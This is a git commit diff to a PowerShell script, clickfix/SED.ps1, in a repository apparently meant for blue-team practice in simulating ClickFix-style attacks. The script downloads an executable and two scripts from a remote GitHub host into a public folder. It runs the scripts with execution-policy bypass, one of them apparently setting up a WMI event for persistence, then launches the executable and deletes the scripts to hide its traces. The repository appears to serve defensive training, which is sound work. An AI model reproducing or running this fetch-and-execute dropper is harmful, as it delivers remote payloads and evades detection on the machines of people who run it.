b28c42a48f8dfd7bf79a56358db51f1ddda6a59c
Aidan Ethier <88387027+acebird@users.noreply.github.com>
2026-03-05 13:56:52 -0500

    Update SED.ps1

--- clickfix/SED.ps1
+++ clickfix/SED.ps1
@@ -1,12 +1,11 @@
-Invoke-WebRequest -Uri "https://github.com/acebird/BlueTeam-Practice/blob/main/clickfix/c723561.exe" -OutFile "C:/Users/Public/c723561.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/sprint.ps1" -OutFile "C:/Users/Public/sprint.ps1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/wmieventcreator.ps1" -OutFile "C:/Users/Public/silly.ps1"
+Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/c723561.exe" -OutFile "C:\Users\Public\c723561.exe"
+Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/sprint.ps1" -OutFile "C:\Users\Public\sprint.ps1"
+Invoke-WebRequest "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/main/clickfix/wmieventcreator.ps1" -OutFile "C:\Users\Public\silly.ps1"
 
+powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\sprint.ps1
+powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\silly.ps1
 
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\sprint.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\silly.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\c723561.exe
+Start-Process "C:\Users\Public\c723561.exe"
 
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\sprint.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
+Remove-Item C:\Users\Public\sprint.ps1
+Remove-Item C:\Users\Public\silly.ps1
